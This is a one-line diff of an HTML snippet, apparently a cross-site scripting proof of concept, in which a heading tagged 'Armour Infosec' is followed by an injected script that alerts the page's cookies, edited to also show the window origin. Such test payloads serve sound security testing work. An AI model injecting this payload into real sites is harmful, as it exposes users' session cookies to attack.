@@ -1,1 +1,1 @@
-<h2>Armour Infosec""</h2><script>alert(document.cookie)</script>
+<h2>Armour Infosec""</h2><script>alert(document.cookie+window.origin)</script>
